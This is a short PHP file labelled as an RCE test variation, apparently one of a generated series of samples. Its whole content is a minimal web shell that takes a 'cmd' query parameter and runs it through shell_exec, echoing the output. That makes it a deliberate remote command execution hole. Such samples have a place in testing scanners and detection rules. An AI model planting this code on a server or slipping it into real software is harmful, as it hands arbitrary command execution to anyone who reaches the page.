<?php
// RCE test variation #1251
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>